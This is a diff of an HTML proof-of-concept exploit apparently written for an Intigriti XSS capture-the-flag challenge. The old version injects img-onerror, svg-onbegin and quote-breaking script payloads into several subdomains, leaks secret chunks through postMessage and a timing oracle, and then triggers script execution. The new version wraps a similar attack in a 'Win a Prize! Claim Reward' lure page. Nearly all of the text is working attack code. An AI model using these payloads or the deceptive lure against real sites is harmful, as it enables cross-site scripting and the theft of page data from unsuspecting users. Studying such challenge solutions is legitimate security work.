@@ -1,76 +1,71 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-    <title>Thanos Infinity Stones Test</title>
-</head>
+<html>
+<head><title>Win a Prize!</title></head>
 <body>
-    <p>Balancing the universe... please wait</p>
-    <script>
-        let chunks = {};
-        const baseUrl = 'https://challenge-1225.intigriti.io/challenge#PerfectlyBalanced';
+<h1>🎁 Click to claim your reward!</h1>
+<button id="go" style="padding:20px;font-size:20px;cursor:pointer;">🎉 Claim Reward</button>
+<pre id="log" style="margin-top:20px;padding:10px;background:#000;color:#0f0;font-family:monospace;"></pre>
+<script>
+const log = m => document.getElementById('log').textContent += m + '\n';
 
-        // Injections for subdomain vulns to leak chunks via postMessage to opener (this window)
-        const params = new URLSearchParams();
-        params.set('mind', '<img src onerror="opener.postMessage({stone:\'mind\',chunk:mindStone},\'*\')">');
-        params.set('reality', '<img src onerror="opener.postMessage({stone:\'reality\',chunk:decodeURIComponent(document.querySelector(\'textarea\').value)},\'*\')">');
-        params.set('action', 'opener.postMessage({stone:\'reality\',chunk:decodeURIComponent(document.querySelector(\'textarea\').value)},\'*\')');
-        params.set('soul', '" ; opener.postMessage({stone:\'soul\',chunk:soulStone},\'*\') ; //');
-        params.set('space', '<svg><animatetransform onbegin="opener.postMessage({stone:\'space\',chunk:document.getElementById(\'space\').shadowRoot.querySelector(\'p\').textContent},\'*\')">');
-
-        const challengeUrl = `${baseUrl}?${params.toString()}`;
-
-        // Open the main as popup
-        const popup = window.open(challengeUrl, 'thanos', 'width=1000,height=800');
-
-        // Listener for leaked chunks from subdomains
-        window.addEventListener('message', (event) => {
-            if (event.data && event.data.stone && event.data.chunk.length === 8) {
-                chunks[event.data.stone] = event.data.chunk;
-                if (Object.keys(chunks).length === 6) {
-                    // Assemble in order: power, mind, reality, space, soul, time
-                    const fullCode = chunks.power + chunks.mind + chunks.reality + chunks.space + chunks.soul + chunks.time;
-                    popup.postMessage(fullCode + 'alert(1)', '*');
-                }
-            }
-        });
-
-        // Leak Power (using soul injection to send message to power iframe)
-        // Add to soul param: ` ; parent.document.querySelector('[src^= "https://power"]').contentWindow.postMessage('&lt;script&gt;opener.postMessage({stone:"power",chunk:power_stone_data},"*")&lt;/script&gt;','*') ; `
-
-        // Leak Time (timing oracle in this PoC)
-        async function leakTimeChunk() {
-            let chunk = '';
-            for (let i = 0; i < 8; i++) {
-                let minDuration = Infinity;
-                let bestHex = '';
-                for (let hex = 0; hex < 16; hex++) {
-                    let guess = chunk + hex.toString(16);
-                    let totalDuration = 0;
-                    for (let trial = 0; trial < 10; trial++) {
-                        let iframe = document.createElement('iframe');
-                        iframe.style.display = 'none';
-                        iframe.src = `https://time.challenge-1225.intigriti.io/search?q=${guess}`;
-                        document.body.appendChild(iframe);
-                        await new Promise(resolve => iframe.onload = resolve);
-                        let entry = performance.getEntriesByName(iframe.src)[0];
-                        totalDuration += entry.duration;
-                        document.body.removeChild(iframe);
-                    }
-                    let avgDuration = totalDuration / 10;
-                    if (avgDuration < minDuration) {
-                        minDuration = avgDuration;
-                        bestHex = hex.toString(16);
-                    }
-                }
-                chunk += bestHex;
-            }
-            chunks.time = chunk;
+let chunks = {};
+window.addEventListener('message', e => {
+    if (!e.data) return;
+    
+    // Collect individual chunks
+    if (e.data.p) { chunks.p = e.data.p; log('Power: ' + e.data.p); }
+    if (e.data.mi) { chunks.mi = e.data.mi; log('Mind: ' + e.data.mi); }
+    if (e.data.r) { chunks.r = e.data.r; log('Reality: ' + e.data.r); }
+    if (e.data.sp) { chunks.sp = e.data.sp; log('Space: ' + e.data.sp); }
+    if (e.data.s) { chunks.s = e.data.s; log('Soul: ' + e.data.s); }
+    if (e.data.t) { chunks.t = e.data.t; log('Time: ' + e.data.t); }
+    
+    // Check if we have all 6 chunks
+    if (chunks.p && chunks.mi && chunks.r && chunks.sp && chunks.s && chunks.t) {
+        const code = chunks.p + chunks.mi + chunks.r + chunks.sp + chunks.s + chunks.t;
+        log('Full code: ' + code);
+        
+        if (popup && !popup.closed) {
+            popup.postMessage(code + 'alert(document.domain)', '*');
+            log('>>> XSS TRIGGERED <<<');
         }
+    }
+});
 
-        // Run the time leak after popup opens (give time for cookie set)
-        setTimeout(leakTimeChunk, 1000);  // Adjust timing if needed
-
-        // For Power, the soul injection extension sends the entity payload to power, executing the leak
-    </script>
+let popup;
+document.getElementById('go').onclick = () => {
+    // Soul injection extracts chunks from parent iframes
+    const soulInject = '";' +
+        'setTimeout(()=>{' +
+            'let p="",mi="",r="",t="";' +
+            'parent.document.querySelectorAll("iframe").forEach(f=>{' +
+                'let u=f.src,m;' +
+                'if(m=u.match(/power_stone=([^&]+)/))p=decodeURIComponent(m[1]);' +
+                'if(m=u.match(/mind_stone=([^&]+)/))mi=decodeURIComponent(m[1]);' +
+                'if(m=u.match(/reality_stone=([^&]+)/))r=decodeURIComponent(m[1]);' +
+                'if(m=u.match(/time_stone=([^&]+)/))t=decodeURIComponent(m[1]);' +
+            '});' +
+            'parent.opener.postMessage({p:p,mi:mi,r:r,s:soulStone,t:t},"*");' +
+        '},1000);//';
+    
+    // Space injection captures the postMessage chunk
+    const spaceInject = '<svg><animatetransform onbegin="' +
+        'parent.opener._sp=``;' +
+        'addEventListener(`message`,e=>{' +
+            'if(typeof e.data===`string` && e.data.length===8){' +
+                'parent.opener._sp=e.data;' +
+                'parent.opener.postMessage({sp:e.data},`*`)' +
+            '}' +
+        '})">';
+    
+    const url = 'https://challenge-1225.intigriti.io/challenge#PerfectlyBalanced' +
+        '?soul=' + encodeURIComponent(soulInject) +
+        '&space=' + encodeURIComponent(spaceInject);
+    
+    log('Opening...');
+    popup = window.open(url, '_blank', 'width=1000,height=800');
+};
+</script>
 </body>
 </html>
+
